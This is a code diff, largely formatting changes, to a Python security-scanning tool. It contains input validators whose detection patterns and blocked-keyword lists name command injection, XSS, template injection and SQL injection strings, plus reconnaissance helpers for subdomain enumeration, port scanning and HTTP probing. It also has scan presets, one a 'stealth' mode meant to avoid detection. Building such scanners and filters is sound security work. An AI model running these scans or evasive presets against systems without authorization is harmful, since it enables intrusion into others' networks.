+            f"{field_name} exceeds maximum length: {len(value)} > {max_length} characters",
+            "WARNING",
+        )
+        logger.log(
+            f"Consider shortening the {field_name} or using a file for longer inputs",
+            "INFO",
+        )
         return False
 
     # Minimum length check
-    min_length = validators.get('min_length', 0)
+    min_length = validators.get("min_length", 0)
     if len(value) < min_length:
-        logger.log(f"{field_name} below minimum length: {len(value)} < {min_length} characters", "WARNING")
+        logger.log(
+            f"{field_name} below minimum length: {len(value)} < {min_length} characters",
+            "WARNING",
+        )
         return False
 
     # Type validation
-    expected_type = validators.get('type', str)
+    expected_type = validators.get("type", str)
     if expected_type == str and not isinstance(value, str):
-        logger.log(f"{field_name} must be a string, got {type(value).__name__}", "WARNING")
+        logger.log(
+            f"{field_name} must be a string, got {type(value).__name__}", "WARNING"
+        )
         return False
 
     # Enhanced security checks with specific pattern explanations
     security_patterns = {
-        r'[;&|`$(){}[\]\\]': 'Command injection characters',
-        r'\.\.\/': 'Path traversal patterns',
-        r'<script[\s>]': 'XSS script tags',
-        r'javascript\s*:': 'JavaScript protocol injection',
-        r'<%.*%>': 'Server-side template injection',
-        r'{{.*}}': 'Template engine injection',
-        r'eval\s*\(': 'Code execution functions',
-        r'exec\s*\(': 'Code execution functions',
-        r'system\s*\(': 'System command execution',
-        r'passthru\s*\(': 'Command execution functions',
-        r'shell_exec\s*\(': 'Shell execution functions',
-        r'\$\{.*\}': 'Variable substitution injection',
-        r'<!--.*#.*-->': 'Server-side include injection',
-        r'<\?php': 'PHP code injection',
-        r'<%@': 'JSP code injection'
+        r"[;&|`$(){}[\]\\]": "Command injection characters",
+        r"\.\.\/": "Path traversal patterns",
+        r"<script[\s>]": "XSS script tags",
+        r"javascript\s*:": "JavaScript protocol injection",
+        r"<%.*%>": "Server-side template injection",
+        r"{{.*}}": "Template engine injection",
+        r"eval\s*\(": "Code execution functions",
+        r"exec\s*\(": "Code execution functions",
+        r"system\s*\(": "System command execution",
+        r"passthru\s*\(": "Command execution functions",
+        r"shell_exec\s*\(": "Shell execution functions",
+        r"\$\{.*\}": "Variable substitution injection",
+        r"<!--.*#.*-->": "Server-side include injection",
+        r"<\?php": "PHP code injection",
+        r"<%@": "JSP code injection",
     }
 
     import re
+
     for pattern, description in security_patterns.items():
         if re.search(pattern, value, re.IGNORECASE):
-            logger.log(f"Security violation in {field_name}: {description} detected", "WARNING")
+            logger.log(
+                f"Security violation in {field_name}: {description} detected", "WARNING"
+            )
             logger.log(f"Suspicious content: {value[:100]}...", "DEBUG")
             return False
 
     # Domain/URL specific validation
-    if validators.get('type') == 'domain':
-        domain_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$'
+    if validators.get("type") == "domain":
+        domain_pattern = r"^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$"
         if not re.match(domain_pattern, value):
             logger.log(f"Invalid domain format for {field_name}: {value}", "WARNING")
-            logger.log("Domain should be in format: example.com or sub.example.com", "INFO")
+            logger.log(
+                "Domain should be in format: example.com or sub.example.com", "INFO"
+            )
             return False
 
     # IP address validation
-    if validators.get('type') == 'ip':
+    if validators.get("type") == "ip":
         try:
             import ipaddress
+
             ipaddress.ip_address(value)
         except ValueError:
-            logger.log(f"Invalid IP address format for {field_name}: {value}", "WARNING")
+            logger.log(
+                f"Invalid IP address format for {field_name}: {value}", "WARNING"
+            )
             logger.log("IP should be in format: 192.168.1.1 or 2001:db8::1", "INFO")
             return False
 
     # URL validation
-    if validators.get('type') == 'url':
+    if validators.get("type") == "url":
         # More flexible URL pattern that handles both domains and IP addresses with ports
-        url_pattern = r'^https?://([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*|(\d{1,3}\.){3}\d{1,3})(:\d+)?(/.*)?$'
+        url_pattern = r"^https?://([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*|(\d{1,3}\.){3}\d{1,3})(:\d+)?(/.*)?$"
         if not re.match(url_pattern, value):
             logger.log(f"Invalid URL format for {field_name}: {value}", "WARNING")
             logger.log("URL should start with http:// or https://", "INFO")
             return False
 
     # Pattern validation with helpful error messages
-    pattern = validators.get('pattern')
+    pattern = validators.get("pattern")
     if pattern:
         if not re.match(pattern, value):
-            logger.log(f"Invalid {field_name} format - does not match expected pattern", "WARNING")
-            pattern_description = validators.get('pattern_description', 'expected format')
+            logger.log(
+                f"Invalid {field_name} format - does not match expected pattern",
+                "WARNING",
+            )
+            pattern_description = validators.get(
+                "pattern_description", "expected format"
+            )
             logger.log(f"Expected format: {pattern_description}", "INFO")
             return False
 
     # Forbidden content check with specific reporting
-    forbidden_content = validators.get('forbidden_content', [])
+    forbidden_content = validators.get("forbidden_content", [])
     for forbidden in forbidden_content:
         if forbidden.lower() in value.lower():
-            logger.log(f"Forbidden content detected in {field_name}: '{forbidden}'", "WARNING")
+            logger.log(
+                f"Forbidden content detected in {field_name}: '{forbidden}'", "WARNING"
+            )
             logger.log("Remove or replace the forbidden content and try again", "INFO")
             return False
 
     # File path validation
-    if validators.get('type') == 'filepath':
-        if not re.match(r'^[a-zA-Z0-9._/-]+$', value):
+    if validators.get("type") == "filepath":
+        if not re.match(r"^[a-zA-Z0-9._/-]+$", value):
             logger.log(f"Invalid file path format for {field_name}: {value}", "WARNING")
-            logger.log("File path should contain only alphanumeric characters, dots, slashes, and hyphens", "INFO")
+            logger.log(
+                "File path should contain only alphanumeric characters, dots, slashes, and hyphens",
+                "INFO",
+            )
             return False
 
     # Rate limit validation
-    if validators.get('type') == 'rate_limit':
+    if validators.get("type") == "rate_limit":
         try:
             rate_val = int(value)
             if rate_val < 1 or rate_val > 10000:
-                logger.log(f"Rate limit out of range for {field_name}: {rate_val} (should be 1-10000)", "WARNING")
+                logger.log(
+                    f"Rate limit out of range for {field_name}: {rate_val} (should be 1-10000)",
+                    "WARNING",
+                )
                 return False
         except ValueError:
-            logger.log(f"Rate limit must be a number for {field_name}: {value}", "WARNING")
+            logger.log(
+                f"Rate limit must be a number for {field_name}: {value}", "WARNING"
+            )
             return False
 
     logger.log(f"Input validation passed for {field_name}", "DEBUG")
     return True
+
 
 def validate_domain_input(domain: str) -> bool:
     """Enhanced domain validation with detailed error reporting"""
@@ -1036,13 +1179,14 @@ def validate_domain_input(domain: str) -> bool:
         return False
 
     # Remove protocol if present
-    domain = domain.replace('http://', '').replace('https://', '').replace('www.', '')
-    domain = domain.split('/')[0]  # Remove path
-    domain = domain.split(':')[0]  # Remove port
+    domain = domain.replace("http://", "").replace("https://", "").replace("www.", "")
+    domain = domain.split("/")[0]  # Remove path
+    domain = domain.split(":")[0]  # Remove port
 
     # Check if this is actually an IP address (should fail domain validation)
     try:
         import ipaddress
+
         ipaddress.ip_address(domain)
         # If we get here, it's a valid IP address, which should fail domain validation
         return False
@@ -1050,24 +1194,27 @@ def validate_domain_input(domain: str) -> bool:
         # Not an IP address, continue with domain validation
         pass
 
-    if not validate_input(domain, {'type': 'domain', 'max_length': 253}, 'domain'):
+    if not validate_input(domain, {"type": "domain", "max_length": 253}, "domain"):
         return False
 
     # Additional domain-specific checks
     # Special case for localhost and similar single-word domains
-    single_word_domains = ['localhost', 'internal', 'local']
-    if domain.count('.') == 0 and domain.lower() not in single_word_domains:
-        logger.log(f"Domain appears to be incomplete: {domain} (missing TLD?)", "WARNING")
+    single_word_domains = ["localhost", "internal", "local"]
+    if domain.count(".") == 0 and domain.lower() not in single_word_domains:
+        logger.log(
+            f"Domain appears to be incomplete: {domain} (missing TLD?)", "WARNING"
+        )
         logger.log("Example of valid domain: example.com", "INFO")
         return False
 
     # Check for localhost or private domains
-    private_domains = ['localhost', '127.0.0.1', '0.0.0.0', 'internal', 'local']
+    private_domains = ["localhost", "127.0.0.1", "0.0.0.0", "internal", "local"]
     if any(private in domain.lower() for private in private_domains):
         logger.log(f"Private/local domain detected: {domain}", "INFO")
         logger.log("Scanning local domains may have limited results", "INFO")
 
     return True
+
 
 def validate_ip_input(ip: str) -> bool:
     """Enhanced IP address validation with detailed error reporting"""
@@ -1075,11 +1222,12 @@ def validate_ip_input(ip: str) -> bool:
         logger.log("IP address cannot be empty", "WARNING")
         return False
 
-    if not validate_input(ip, {'type': 'ip', 'max_length': 45}, 'IP address'):
+    if not validate_input(ip, {"type": "ip", "max_length": 45}, "IP address"):
         return False
 
     try:
         import ipaddress
+
         ip_obj = ipaddress.ip_address(ip)
 
         # Check for private/reserved IP addresses
@@ -1102,17 +1250,19 @@ def validate_ip_input(ip: str) -> bool:
         logger.log(f"Invalid IP address format: {ip} - {e}", "WARNING")
         return False
 
+
 def validate_url_input(url: str) -> bool:
     """Enhanced URL validation with detailed error reporting"""
     if not url:
         logger.log("URL cannot be empty", "WARNING")
         return False
 
-    if not validate_input(url, {'type': 'url', 'max_length': 2048}, 'URL'):
+    if not validate_input(url, {"type": "url", "max_length": 2048}, "URL"):
         return False
 
     # Additional URL-specific checks
     from urllib.parse import urlparse
+
     try:
         parsed = urlparse(url)
 
@@ -1121,7 +1271,7 @@ def validate_url_input(url: str) -> bool:
             logger.log("URL should start with http:// or https://", "INFO")
             return False
 
-        if parsed.scheme not in ['http', 'https']:
+        if parsed.scheme not in ["http", "https"]:
             logger.log(f"Unsupported URL protocol: {parsed.scheme}", "WARNING")
             logger.log("Only HTTP and HTTPS protocols are supported", "INFO")
             return False
@@ -1137,6 +1287,7 @@ def validate_url_input(url: str) -> bool:
             # Check if it's an IP address
             try:
                 import ipaddress
+
                 ipaddress.ip_address(hostname)
                 # For URLs, we accept all valid IP addresses including private ones
                 return True
@@ -1152,71 +1303,83 @@ def validate_url_input(url: str) -> bool:
 
 # ---------- Enhanced Input Sanitization System ----------
 
+
 class EnhancedInputSanitizer:
     """Advanced input sanitization with security-first approach"""
-    
+
     # Comprehensive pattern definitions
     PATTERNS = {
-        'domain': r'^[a-zA-Z0-9]([a-zA-Z0-9\-\.]{0,253}[a-zA-Z0-9])?$',
-        'email': r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$',
-        'url': r'^https?://[^\s/$.?#].[^\s]*$',
-        'ipv4': r'^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$',
-        'port': r'^([1-9]|[1-5]?[0-9]{2,4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$',
-        'filename': r'^[a-zA-Z0-9._-]+$',
-        'safe_string': r'^[a-zA-Z0-9\s._-]+$'
+        "domain": r"^[a-zA-Z0-9]([a-zA-Z0-9\-\.]{0,253}[a-zA-Z0-9])?$",
+        "email": r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$",
+        "url": r"^https?://[^\s/$.?#].[^\s]*$",
+        "ipv4": r"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$",
+        "port": r"^([1-9]|[1-5]?[0-9]{2,4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$",
+        "filename": r"^[a-zA-Z0-9._-]+$",
+        "safe_string": r"^[a-zA-Z0-9\s._-]+$",
     }
-    
+
     # Dangerous patterns to block
     DANGEROUS_PATTERNS = [
-        r'[;&|`$()<>{}\\]',  # Command injection chars
-        r'\.\./',            # Directory traversal
-        r'<script[^>]*>',    # XSS script tags
-        r'javascript:',      # JavaScript protocol
-        r'\x00',            # Null bytes
+        r"[;&|`$()<>{}\\]",  # Command injection chars
+        r"\.\./",  # Directory traversal
+        r"<script[^>]*>",  # XSS script tags
+        r"javascript:",  # JavaScript protocol
+        r"\x00",  # Null bytes
     ]
-    
+
     def __init__(self):
         self.blocked_keywords = [
-            'DROP TABLE', 'DELETE FROM', 'INSERT INTO', 'UNION SELECT',
-            '--', '/*', '*/', '<script>', 'javascript:', 'eval(',
-            'exec(', 'system(', 'shell_exec('
+            "DROP TABLE",
+            "DELETE FROM",
+            "INSERT INTO",
+            "UNION SELECT",
+            "--",
+            "/*",
+            "*/",
+            "<script>",
+            "javascript:",
+            "eval(",
+            "exec(",
+            "system(",
+            "shell_exec(",
         ]
-    
-    def sanitize_input(self, data: str, input_type: str = 'safe_string', 
-                      max_length: int = 1000) -> Tuple[bool, str, List[str]]:
+
+    def sanitize_input(
+        self, data: str, input_type: str = "safe_string", max_length: int = 1000
+    ) -> Tuple[bool, str, List[str]]:
         """Comprehensive input sanitization"""
         warnings = []
-        
+
         if not data:
             return False, "", ["Empty input not allowed"]
-        
+
         # Length check
         if len(data) > max_length:
             warnings.append(f"Input truncated from {len(data)} to {max_length}")
             data = data[:max_length]
-        
+
         # Remove control characters
         original_len = len(data)
-        data = re.sub(r'[\x00-\x08\x0B\x0C\x0E-\x1F\x7F-\x9F]', '', data)
+        data = re.sub(r"[\x00-\x08\x0B\x0C\x0E-\x1F\x7F-\x9F]", "", data)
         if len(data) != original_len:
             warnings.append("Removed control characters")
-        
+
         # Check for dangerous patterns
         for pattern in self.DANGEROUS_PATTERNS:
             if re.search(pattern, data, re.IGNORECASE):
                 return False, "", [f"Dangerous pattern detected"]
-        
+
         # Check for blocked keywords
         data_upper = data.upper()
         for keyword in self.blocked_keywords:
             if keyword in data_upper:
                 return False, "", [f"Blocked keyword detected"]
-        
+
         # Type-specific validation
         if input_type in self.PATTERNS:
             if not re.match(self.PATTERNS[input_type], data):
                 return False, "", [f"Invalid format for type: {input_type}"]
-        
+
         return True, data.strip(), warnings
 
 
@@ -1224,7 +1387,7 @@ class EnhancedInputSanitizer:
 GLOBAL_SANITIZER = EnhancedInputSanitizer()
 
 
-def sanitize_user_input(data: str, input_type: str = 'safe_string') -> Tuple[bool, str]:
+def sanitize_user_input(data: str, input_type: str = "safe_string") -> Tuple[bool, str]:
     """Convenient wrapper for global sanitizer"""
     is_valid, sanitized, warnings = GLOBAL_SANITIZER.sanitize_input(data, input_type)
     if warnings:
@@ -1243,18 +1406,34 @@ def create_fallback_functions():
         # Extract domain from args
         domain = None
         for i, arg in enumerate(args):
-            if i > 0 and not arg.startswith('-'):  # Likely the domain
+            if i > 0 and not arg.startswith("-"):  # Likely the domain
                 domain = arg
                 break
 
         if not domain:
-            logger.log("Cannot determine domain for fallback subdomain enumeration", "ERROR")
+            logger.log(
+                "Cannot determine domain for fallback subdomain enumeration", "ERROR"
+            )
             return False
 
         # Simple DNS-based subdomain discovery
         common_subdomains = [
-            'www', 'mail', 'ftp', 'admin', 'api', 'test', 'dev', 'staging',
-            'blog', 'shop', 'portal', 'secure', 'vpn', 'cdn', 'm', 'mobile'
+            "www",
+            "mail",
+            "ftp",
+            "admin",
+            "api",
+            "test",
+            "dev",
+            "staging",
+            "blog",
+            "shop",
+            "portal",
+            "secure",
+            "vpn",
+            "cdn",
+            "m",
+            "mobile",
         ]
 
         found_subdomains = []
@@ -1276,7 +1455,10 @@ def create_fallback_functions():
             if output_file:
                 result_content = "\n".join(found_subdomains) + "\n"
                 atomic_write(output_file, result_content)
-                logger.log(f"Fallback subdomain enumeration found {len(found_subdomains)} subdomains", "INFO")
+                logger.log(
+                    f"Fallback subdomain enumeration found {len(found_subdomains)} subdomains",
+                    "INFO",
+                )
                 return True
 
         except Exception as e:
@@ -1292,7 +1474,7 @@ def create_fallback_functions():
         # Extract target from args
         target = None
         for i, arg in enumerate(args):
-            if i > 0 and not arg.startswith('-'):  # Likely the target
+            if i > 0 and not arg.startswith("-"):  # Likely the target
                 target = arg
                 break
 
@@ -1323,7 +1505,9 @@ def create_fallback_functions():
             if output_file:
                 result_content = "\n".join(open_ports) + "\n"
                 atomic_write(output_file, result_content)
-                logger.log(f"Fallback port scan found {len(open_ports)} open ports", "INFO")
+                logger.log(
+                    f"Fallback port scan found {len(open_ports)} open ports", "INFO"
+                )
                 return True
 
         except Exception as e:
@@ -1339,9 +1523,9 @@ def create_fallback_functions():
         # Extract URLs from args or construct from targets
         urls = []
         for arg in args:
-            if arg.startswith('http'):
+            if arg.startswith("http"):
                 urls.append(arg)
-            elif '.' in arg and not arg.startswith('-'):
+            elif "." in arg and not arg.startswith("-"):
                 urls.extend([f"http://{arg}", f"https://{arg}"])
 
         if not urls:
@@ -1358,7 +1542,9 @@ def create_fallback_functions():
                     response = requests.get(url, timeout=5, verify=False)
                     if response.status_code < 400:
                         live_urls.append(f"{url} [{response.status_code}]")
-                        logger.log(f"HTTP probe: {url} - {response.status_code}", "DEBUG")
+                        logger.log(
+                            f"HTTP probe: {url} - {response.status_code}", "DEBUG"
+                        )
                 except Exception:
                     continue
 
@@ -1366,7 +1552,9 @@ def create_fallback_functions():
             if output_file:
                 result_content = "\n".join(live_urls) + "\n"
                 atomic_write(output_file, result_content)
-                logger.log(f"Fallback HTTP probe found {len(live_urls)} live URLs", "INFO")
+                logger.log(
+                    f"Fallback HTTP probe found {len(live_urls)} live URLs", "INFO"
+                )
                 return True
 
         except Exception as e:
@@ -1377,19 +1565,22 @@ def create_fallback_functions():
 
     # Return mapping of tool names to fallback functions
     return {
-        'subfinder': fallback_subdomain_enum,
-        'amass': fallback_subdomain_enum,
-        'nmap': fallback_port_scan,
-        'naabu': fallback_port_scan,
-        'masscan': fallback_port_scan,
-        'httpx': fallback_http_probe
+        "subfinder": fallback_subdomain_enum,
+        "amass": fallback_subdomain_enum,
+        "nmap": fallback_port_scan,
+        "naabu": fallback_port_scan,
+        "masscan": fallback_port_scan,
+        "httpx": fallback_http_probe,
     }
+
 
 # Initialize fallback functions
 FALLBACK_FUNCTIONS = create_fallback_functions()
 
-def safe_http_request(url: str, method: str = 'GET', timeout: int = 10,
-                     retries: int = 3, **kwargs) -> Optional[Dict[str, Any]]:
+
+def safe_http_request(
+    url: str, method: str = "GET", timeout: int = 10, retries: int = 3, **kwargs
+) -> Optional[Dict[str, Any]]:
     """Safe HTTP request with enhanced error handling and retry logic"""
     try:
         import requests
@@ -1401,7 +1592,7 @@ def safe_http_request(url: str, method: str = 'GET', timeout: int = 10,
             total=retries,
             backoff_factor=1,
             status_forcelist=[429, 500, 502, 503, 504],
-            allowed_methods=["HEAD", "GET", "OPTIONS", "POST"]
+            allowed_methods=["HEAD", "GET", "OPTIONS", "POST"],
         )
 
         # Create session with retry adapter
@@ -1412,18 +1603,20 @@ def safe_http_request(url: str, method: str = 'GET', timeout: int = 10,
 
         # Set default headers
         default_headers = {
-            'User-Agent': 'Bl4ckC3ll_PANTHEON/9.0.0 Security Scanner',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.5',
-            'Accept-Encoding': 'gzip, deflate',
-            'Connection': 'keep-alive'
+            "User-Agent": "Bl4ckC3ll_PANTHEON/9.0.0 Security Scanner",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Accept-Encoding": "gzip, deflate",
+            "Connection": "keep-alive",
         }
 
-        headers = kwargs.get('headers', {})
+        headers = kwargs.get("headers", {})
         headers.update(default_headers)
-        kwargs['headers'] = headers
-        kwargs['timeout'] = timeout
-        kwargs['verify'] = kwargs.get('verify', False)  # Disable SSL verification for security testing
+        kwargs["headers"] = headers
+        kwargs["timeout"] = timeout
+        kwargs["verify"] = kwargs.get(
+            "verify", False
+        )  # Disable SSL verification for security testing
 
         logger.log(f"Making {method} request to {url}", "DEBUG")
 
@@ -1431,85 +1624,100 @@ def safe_http_request(url: str, method: str = 'GET', timeout: int = 10,
         response = session.request(method, url, **kwargs)
 
         result = {
-            'status_code': response.status_code,
-            'headers': dict(response.headers),
-            'content': response.text,
-            'url': response.url,
-            'elapsed': response.elapsed.total_seconds(),
-            'success': True
+            "status_code": response.status_code,
+            "headers": dict(response.headers),
+            "content": response.text,
+            "url": response.url,
+            "elapsed": response.elapsed.total_seconds(),
+            "success": True,
         }
 
-        logger.log(f"HTTP request successful: {url} - {response.status_code} ({response.elapsed.total_seconds():.2f}s)", "DEBUG")
+        logger.log(
+            f"HTTP request successful: {url} - {response.status_code} ({response.elapsed.total_seconds():.2f}s)",
+            "DEBUG",
+        )
         return result
 
     except requests.exceptions.ConnectionError as e:
         logger.log(f"Connection error for {url}: {e}", "WARNING")
         logger.log("Check network connectivity and target availability", "INFO")
-        return {'success': False, 'error': 'connection_error', 'message': str(e)}
+        return {"success": False, "error": "connection_error", "message": str(e)}
 
     except requests.exceptions.Timeout as e:
         logger.log(f"Request timeout for {url}: {e}", "WARNING")
-        logger.log(f"Consider increasing timeout (current: {timeout}s) or check network speed", "INFO")
-        return {'success': False, 'error': 'timeout', 'message': str(e)}
+        logger.log(
+            f"Consider increasing timeout (current: {timeout}s) or check network speed",
+            "INFO",
+        )
+        return {"success": False, "error": "timeout", "message": str(e)}
 
     except requests.exceptions.SSLError as e:
         logger.log(f"SSL error for {url}: {e}", "WARNING")
-        logger.log("SSL verification disabled for security testing, but target may have SSL issues", "INFO")
-        return {'success': False, 'error': 'ssl_error', 'message': str(e)}
+        logger.log(
+            "SSL verification disabled for security testing, but target may have SSL issues",
+            "INFO",
+        )
+        return {"success": False, "error": "ssl_error", "message": str(e)}
 
     except requests.exceptions.TooManyRedirects as e:
         logger.log(f"Too many redirects for {url}: {e}", "WARNING")
         logger.log("Target may have redirect loops or excessive redirects", "INFO")
-        return {'success': False, 'error': 'redirect_error', 'message': str(e)}
+        return {"success": False, "error": "redirect_error", "message": str(e)}
 
     except requests.exceptions.RequestException as e:
         logger.log(f"Request error for {url}: {e}", "WARNING")
-        logger.log("General request error - check URL format and target availability", "INFO")
-        return {'success': False, 'error': 'request_error', 'message': str(e)}
+        logger.log(
+            "General request error - check URL format and target availability", "INFO"
+        )
+        return {"success": False, "error": "request_error", "message": str(e)}
 
     except Exception as e:
         logger.log(f"Unexpected error making request to {url}: {e}", "ERROR")
-        return {'success': False, 'error': 'unexpected_error', 'message': str(e)}
+        return {"success": False, "error": "unexpected_error", "message": str(e)}
 
 
 # ---------- Performance Monitoring System ----------
 
+
 class PerformanceMonitor:
     """Advanced performance monitoring and optimization system"""
-    
+
     def __init__(self, max_history: int = 100):
         self.max_history = max_history
         self.metrics_history = []
         self.start_time = time.time()
         self.monitoring = False
         self.monitor_thread = None
-        
+
     def start_monitoring(self):
         """Start performance monitoring in background"""
         if not self.monitoring and HAS_PSUTIL:
             self.monitoring = True
-            self.monitor_thread = threading.Thread(target=self._monitor_loop, daemon=True)
+            self.monitor_thread = threading.Thread(
+                target=self._monitor_loop, daemon=True
+            )
             self.monitor_thread.start()
             logger.log("Performance monitoring started", "INFO")
-    
+
     def stop_monitoring(self):
         """Stop performance monitoring"""
         self.monitoring = False
         if self.monitor_thread:
             self.monitor_thread.join(timeout=1)
             logger.log("Performance monitoring stopped", "INFO")
-    
+
     def _monitor_loop(self):
         """Main monitoring loop"""
         import psutil
+
         while self.monitoring:
             try:
                 metrics = {
-                    'timestamp': datetime.now().isoformat(),
-                    'cpu_percent': psutil.cpu_percent(interval=0.1),
-                    'memory_percent': psutil.virtual_memory().percent,
-                    'disk_percent': psutil.disk_usage('/').percent,
-                    'uptime_seconds': time.time() - self.start_time
+                    "timestamp": datetime.now().isoformat(),
+                    "cpu_percent": psutil.cpu_percent(interval=0.1),
+                    "memory_percent": psutil.virtual_memory().percent,
+                    "disk_percent": psutil.disk_usage("/").percent,
+                    "uptime_seconds": time.time() - self.start_time,
                 }
                 self.metrics_history.append(metrics)
                 if len(self.metrics_history) > self.max_history:
@@ -1517,37 +1725,38 @@ class PerformanceMonitor:
                 time.sleep(5)  # Collect metrics every 5 seconds
             except Exception:
                 pass  # Continue monitoring even if errors occur
-    
+
     def get_current_metrics(self):
         """Get the most recent metrics"""
         return self.metrics_history[-1] if self.metrics_history else None
-    
+
     def should_throttle_operations(self) -> bool:
         """Check if operations should be throttled based on current resources"""
         current = self.get_current_metrics()
         if not current:
             return False
-        
-        cpu_high = current.get('cpu_percent', 0) > 85
-        memory_high = current.get('memory_percent', 0) > 85
-        
+
+        cpu_high = current.get("cpu_percent", 0) > 85
+        memory_high = current.get("memory_percent", 0) > 85
+
         return cpu_high or memory_high
-    
+
     def get_optimal_threads(self) -> int:
         """Calculate optimal number of threads based on current system load"""
         if not HAS_PSUTIL:
             return 2  # Safe default
-        
+
         import psutil
+
         current = self.get_current_metrics()
         base_threads = psutil.cpu_count() or 2
-        
+
         if not current:
             return max(1, base_threads // 2)
-        
-        cpu_percent = current.get('cpu_percent', 0)
-        memory_percent = current.get('memory_percent', 0)
-        
+
+        cpu_percent = current.get("cpu_percent", 0)
+        memory_percent = current.get("memory_percent", 0)
+
         # Reduce threads based on system load
         if cpu_percent > 80 or memory_percent > 80:
             return max(1, base_threads // 4)
@@ -1560,6 +1769,7 @@ class PerformanceMonitor:
 # Check if psutil is available for performance monitoring
 try:
     import psutil
+
     HAS_PSUTIL = True
 except ImportError:
     HAS_PSUTIL = False
@@ -1570,6 +1780,7 @@ GLOBAL_PERFORMANCE_MONITOR = PerformanceMonitor()
 
 # ---------- Preset Scan Configurations ----------
 
+
 class ScanPresets:
     """Pre-configured scan types and option combinations for easy activation"""
 
@@ -1578,145 +1789,243 @@ class ScanPresets:
             "name": "Quick Scan",
             "description": "Fast reconnaissance and basic vulnerability scan",
             "duration": "5-10 minutes",
-            "modules": ["subdomain_discovery", "port_scan_top100", "http_probe", "basic_vuln_scan"],
+            "modules": [
+                "subdomain_discovery",
+                "port_scan_top100",
+                "http_probe",
+                "basic_vuln_scan",
+            ],
             "config": {
                 "nuclei": {"severity": "high,critical", "rps": 1000, "timeout": 10},
                 "port_scan": {"top_ports": 100, "timing": 4},
                 "subdomain_tools": ["subfinder", "httpx"],
-                "concurrency": 20
-            }
+                "concurrency": 20,
+            },
         },
         "standard": {
             "name": "Standard Scan",
             "description": "Comprehensive reconnaissance and vulnerability assessment",
             "duration": "15-30 minutes",
-            "modules": ["subdomain_discovery", "port_scan_top1000", "http_probe", "directory_fuzzing", "vuln_scan", "tech_detection"],
+            "modules": [
+                "subdomain_discovery",
+                "port_scan_top1000",
+                "http_probe",
+                "directory_fuzzing",
+                "vuln_scan",
+                "tech_detection",
+            ],
             "config": {
-                "nuclei": {"severity": "info,low,medium,high,critical", "rps": 800, "timeout": 15},
+                "nuclei": {
+                    "severity": "info,low,medium,high,critical",
+                    "rps": 800,
+                    "timeout": 15,
+                },
                 "port_scan": {"top_ports": 1000, "timing": 4},
                 "subdomain_tools": ["subfinder", "amass", "httpx"],
                 "fuzzing": {"threads": 30, "wordlist": "medium"},
-                "concurrency": 25
-            }
+                "concurrency": 25,
+            },
         },
         "deep": {
             "name": "Deep Scan",
             "description": "Extensive reconnaissance with thorough vulnerability testing",
             "duration": "45-90 minutes",
-            "modules": ["subdomain_discovery", "full_port_scan", "http_probe", "directory_fuzzing", "parameter_discovery", "vuln_scan", "tech_detection", "web_crawling"],
+            "modules": [
+                "subdomain_discovery",
+                "full_port_scan",
+                "http_probe",
+                "directory_fuzzing",
+                "parameter_discovery",
+                "vuln_scan",
+                "tech_detection",
+                "web_crawling",
+            ],
             "config": {
-                "nuclei": {"severity": "info,low,medium,high,critical", "rps": 600, "timeout": 30},
+                "nuclei": {
+                    "severity": "info,low,medium,high,critical",
+                    "rps": 600,
+                    "timeout": 30,
+                },
                 "port_scan": {"all_ports": True, "timing": 3},
-                "subdomain_tools": ["subfinder", "amass", "assetfinder", "findomain", "httpx"],
+                "subdomain_tools": [
+                    "subfinder",
+                    "amass",
+                    "assetfinder",
+                    "findomain",
+                    "httpx",
+                ],
                 "fuzzing": {"threads": 50, "wordlist": "large", "recursive": True},
                 "parameter_discovery": True,
                 "web_crawling": True,
-                "concurrency": 30
-            }
+                "concurrency": 30,
+            },
         },
         "stealth": {
             "name": "Stealth Scan",
             "description": "Low-profile scanning to avoid detection",
             "duration": "30-60 minutes",
-            "modules": ["passive_subdomain_discovery", "stealth_port_scan", "http_probe", "vuln_scan"],
+            "modules": [
+                "passive_subdomain_discovery",
+                "stealth_port_scan",
+                "http_probe",
+                "vuln_scan",
+            ],
             "config": {
-                "nuclei": {"severity": "medium,high,critical", "rps": 100, "timeout": 30},
+                "nuclei": {
+                    "severity": "medium,high,critical",
+                    "rps": 100,
+                    "timeout": 30,
+                },
                 "port_scan": {"timing": 1, "top_ports": 100},
                 "subdomain_tools": ["passive_only"],
                 "stealth_mode": True,
                 "delays": {"between_requests": 2, "between_tools": 5},
-                "concurrency": 5
-            }
+                "concurrency": 5,
+            },
         },
         "webapp": {
             "name": "Web Application Focused",
             "description": "Specialized scan for web application security testing",
             "duration": "20-45 minutes",
-            "modules": ["subdomain_discovery", "http_probe", "directory_fuzzing", "parameter_discovery", "web_vuln_scan", "api_testing"],
+            "modules": [
+                "subdomain_discovery",
+                "http_probe",
+                "directory_fuzzing",
+                "parameter_discovery",
+                "web_vuln_scan",
+                "api_testing",
+            ],
             "config": {
-                "nuclei": {"tags": "web,xss,sqli,lfi,rce", "severity": "low,medium,high,critical"},
+                "nuclei": {
+                    "tags": "web,xss,sqli,lfi,rce",
+                    "severity": "low,medium,high,critical",
+                },
